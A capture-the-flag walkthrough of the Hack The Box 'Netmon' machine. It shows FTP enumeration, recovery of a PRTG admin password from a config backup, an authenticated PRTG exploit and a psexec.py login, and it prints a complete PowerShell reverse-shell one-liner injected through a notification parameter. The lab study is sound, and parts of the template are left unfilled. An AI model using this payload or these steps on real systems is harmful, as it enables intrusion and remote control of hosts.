# Netmon - HTB

Netmon - 10.10.10.152

![](/images/netmon/1. netmon.png "Netmon Info Card")

Contents:

1. TOC
{:toc}

<p>&nbsp;</p>
=======================================================

## Introduction

=======================================================

Broad introduction to the machine.

<p>&nbsp;</p>
=======================================================

## Tools & Techniques Used

=======================================================

Summary paragraph. We will not use Metasploit for Netmon, but there are two different techniques to show for manual exploitation.

-1- nmap

-2- 

-3- 

-4- 

-5- 

-6- 

-7- 

<p>&nbsp;</p>
=======================================================

## Scanning and Enumeration

=======================================================



nmap -A -T4 10.10.10.152

![](/images/netmon/2. nmap.png)

![](/images/netmon/2. nmap_2.png)


A few ports open:
    21 ftp -> looks to be allowing anonymous access on the C:\ drive.  Generally not a good thing
    80 http -> PRTG Network Monitor, 18.1.37.13946
    135, 139, 445 -> Microsoft RPC and netbios/smb.
    O/S looks like Windows Server 2008 R2 - 2012

Let's go look at the web page:

![](/images/netmon/3. website.png)


A web login form.  Let's see if there are default creds:  Google “PRTG Network Monitor default credentials”

![](/images/netmon/4. google.png)


Let's try “prtgadmin” for both the username and password:

![](/images/netmon/5. default.png)


No joy.  Now let's Google for an exploit against PRTG Network Monitor:

![](/images/netmon/6. google.png)


https://www.exploit-db.com/exploits/46527

![](/images/netmon/7. exploitdb.png)


Okay so we have an exploit db entry for version 18.2.38. Our nmap showed version 18.2.37 running, so that is close enough for use to keep following up on this one. However, the title notes that it is “Authenticated”, meaning we must have valid username:password combination and we don't have it at the moment.
Let's see what else this exploit requires:

![](/images/netmon/8. exploitdb.png)


So once we have valid creds, we need to log in to the application and grab our session cookie, then provide the cookie to the script for exploit.  After the script runs successfully, we will have a new user ‘pentest’ in the administrators group with the password ‘P3nT3st!’
Download the script and save it to your current directory.

But where to find creds?  Well, we had ftp open so let's start there:
    ftp 10.10.10.152
    anonymous
    anon

![](/images/netmon/9. ftp.png)


I also ran the “pwd” and “dir” commands to see where we are.  Now that we have access to the file structure, we need to figure out where PRTG Network Monitor stores its data and/or config files. We might be able to search through them for valid username:password pairs.

Let's check Google again to see if we can find where some useful files might be stored:

![](/images/netmon/10. google.png)


https://www.paessler.com/manuals/prtg/data_storage

![](/images/netmon/11. paessler.png)


Since nmap had an O/S guess of Windows Server 2008/2012, let's see if we can find the top file path for our PRTG data.
For ftp, using “ls -la” is your friend because it will display hidden files and folders:
    ls -la

![](/images/netmon/12. ftp.png)


→ So here we are in the root directory still, but with “ls -la” we get more files and folders to look through.  And there is a “ProgramData” folder which looks like a start on the directory structure we are looking for:
    ls  ProgramData

![](/images/netmon/13. ftp_ls.png)


And we see a Paessler folder like we were expecting. So far this is looking good.  Keep going:
    cd ProgramData/Paessler
    ls -la

![](/images/netmon/14. ftp_enum.png)


    cd “PRTG Network Monitor”

    ls -la

![](/images/netmon/14. ftp_enum_2.png)


→ And bingo, we have some PRTG Configuration files.  Since the PRTG Configuration.dat and .old files have the same file size and date/time stamp, let's just grab the current one. But there is also a “.old.bak” with a timestamp from several months before so let's grab that one too:
    get “PRTG Configuration.dat”
    get “PRTG Configuration.old.bak”

![](/images/netmon/15. ftp_get.png)


Okay, for now on our ftp session we are done, so exit:
    bye

![](/images/netmon/16. bye.png)


So we have thte two PRTG files. Let's do some basic grep and searching for “admin”:
    cat "PRTG Configuration.dat" | grep admin

![](/images/netmon/17. cat.png)


And we see “prtgadmin” which if you recall is the default admin username. So let's switch our grep term a bit:
    cat "PRTG Configuration.dat" | grep -n12 prtgadmin

![](/images/netmon/17. cat_2.png)


So here we have what looks like the password field but it is “encrypted”.  Let's try the older file:
    cat "PRTG Configuration.old.bak" | grep -n12 prtgadmin

![](/images/netmon/17. cat_3.png)


We receive more output, and in the top of that output we see as a possible password: PrTg@dmin2018 for user prtgadmin.  Let's go try it out!



<p>&nbsp;</p>
=======================================================

## Exploitation using Metasploit

=======================================================

None! Manual all the way for this one.

<p>&nbsp;</p>
=======================================================

## Manual Exploitation

=======================================================


So back on the http://10.10.10.152 page, we can try to log in with prtgadmin:PrTg@dmin2018

![](/images/netmon/18. prtg.png)


Well that didn't work. But remember, the file you pulled this password from was dated 2018. And the password ended in 2018, so why don't we try changing the password to 2019:
    prtgadmin:PrTg@dmin2019

![](/images/netmon/19. welcome.png)


And we have access!  Now we need to find our session cookie, so either fire up Burp Suite and use the intercept (proxy) or go to Firefox's developer tools:

![](/images/netmon/20. dev_tools.png)


And here we have our session cookie to plug in to the script!:
    OCTOPUS1813713946=e0JGRDM2OEMwLTQ0MzAtNDBGRS05NTcwLTNCMTk5ODZBQzk3NH0

Now let's run our bash script!
    ./46257.sh

![](/images/netmon/21. 46257.png)


That's one heck of a usage screen!  So it looks like our actual command should be:
    ./46257.sh -u http://10.10.10.152 -c "OCTOPUS1813713946=e0JGRDM2OEMwLTQ0MzAtNDBGRS05NTcwLTNCMTk5ODZBQzk3NH0"

![](/images/netmon/22. 46257_exploit.png)

(snipped)

![](/images/netmon/22. 46257_exploit_2.png)


Looks like it worked!  Now let's try to log back in via impacket's psexec.py.  
    https://github.com/SecureAuthCorp/impacket
    git clone that repository into /opt and then 
    cd impacket
    pip install .

After the install you should be able to run psexec.py
    psexec.py

![](/images/netmon/23. psexec.png)


So our command to exploit should be something like:
    psexec.py pentest:'P3nT3st!'@10.10.10.152 

![](/images/netmon/23. psexec_2.png)


Success! We are system. Let's go get our flags:
    type C:\Users\Public\user.txt

![](/images/netmon/24. user.png)


    type C:\Users\Administrator\Desktop\root.txt

![](/images/netmon/25. root.png)


And there we have our flags.

<p>&nbsp;</p>
=======================================================

## Manual Exploitation without Creating a New User Account

=======================================================

And alternate way is to directly obtain a system level shell using a powershell one-liner reverse shell:

https://davidhamann.de/2020/01/22/htb-writeup-netmon/

Log in to the PRTG admin web page, click the dropdown menu on the left (three horizontal bars) then click Setup:

![](/images/netmon/26. setup.png)


On the screen that comes up next, click “Notifications”:

![](/images/netmon/27. notifications.png)


On the far right, click “Add New Notification”

![](/images/netmon/28. add.png)


Give your Notification an easy-to-remember name then scroll down until you see “Execute Program”:

![](/images/netmon/29. notification.png)



Netmon (Windows) PRTG authenticated exploit, psexec.py privesc, alt privesc powershell one-line

![](/images/netmon/30. execute.png)

r

Click Execute Program

→ Go to a one-line reverse shell cheat sheet...like this:  
    https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#powershell
Prep your one-line powershell reverse shell command like this:
    Test; "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.24',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()" 

![](/images/netmon/30. execute_2.png)



Change the “Program File” setting to read “Demo exe notification - outfile.ps1”
Paste your one-line powershell reverse shell into the “Parameter” box
Click Save

→ Start a nc listener on Kali, in the above example I am triggering the callback to port 4444, so we need to listen on that port:
    nc -lvnp 4444



Now, trigger the Notification on the PRTG monitor page:

![](/images/netmon/31. trigger.png)



To trigger the notification, click the Notepad/Edit box at the end of your notification's row. Then click the Bell icon to trigger.  In about 5-15 seconds in your Kali nc listener window you should see:

![](/images/netmon/32. nc_connection.png)



If it doesn't give you the prompt upon displaying the “connect to [x.x.x.x]” line, just hit <Enter> one time.

Success!  We are system.





<p>&nbsp;</p>
=======================================================

## Final Code

=======================================================

<file-name.py/.sh>

    insert code here
    # code blocks ignore the rest of markdown formatting
    # so you can leave # characters to denote comments
    # without setting new headings
        

<p>&nbsp;</p>
=======================================================

## Links & Additional Reading

=======================================================

1. Link: []()
2. Link: []()
3. Link: []()
4. Link: []()
5. Link: []()

<p>&nbsp;</p>
=======================================================

## Basic formatting

=======================================================

You can use *italics*, **bold**, `code font text`, and create [links](https://www.markdownguide.org/cheat-sheet/). Here's a footnote [^1]. Here's a horizontal rule:

<p>&nbsp;</p>

=======================================================

![rax logo](/images/rax_intel.png)

<p>&nbsp;</p>
